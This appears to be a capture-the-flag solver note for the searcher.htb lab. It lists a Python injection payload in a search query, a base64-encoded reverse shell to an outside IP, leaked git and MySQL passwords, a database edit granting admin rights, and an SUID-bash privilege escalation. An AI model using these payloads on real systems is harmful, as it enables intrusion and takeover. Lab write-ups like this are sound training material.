## Solver
```
Got redirect domain to searcher.htb
Found github on pagesource
Found removed eval on same version
https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b#diff-40a1b591e95ee135f3f26e8ffa117a4816c202b6ce76852be85018fed09c4436

foothold
engine=Accuweather&query=id',__import__("os").system("ls+-la"))#

Revshell
engine=Accuweather&query=id',__import__("os").system("echo+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTQvMTIzNCAwPiYxCg==|base64+-d|bash"))#

Found subdomain gitea.searcher.htb
found git username and email from home path
found password git from /var/www/app/.git/config
cody:jh1usoih2bkjaspwe92

The password same as svc user
sudo -l got root run service
sudo python3 /opt/scripts/system-checkup.py docker-ps

Check container config:
sudo python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' 960873171e2e

Check container IP:
sudo python3 /opt/scripts/system-checkup.py docker-inspect --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' f84a6b33fb5a

Check mysql:
mysql --host=172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh -P 3306 gitea

Change is_admin from 0 to 1 in mysql
UPDATE user set is_admin=1 where name='cody';

Read system-checkup.py
Found action full-checkup run command ./full-checkup.sh : its mean on current directory

privesc
create full-checkup.sh on /tmp contain chmod +s /bin/bash
run sudo python3 /opt/scripts/system-checkup.py full-checkup on /tmp directory

got root
```
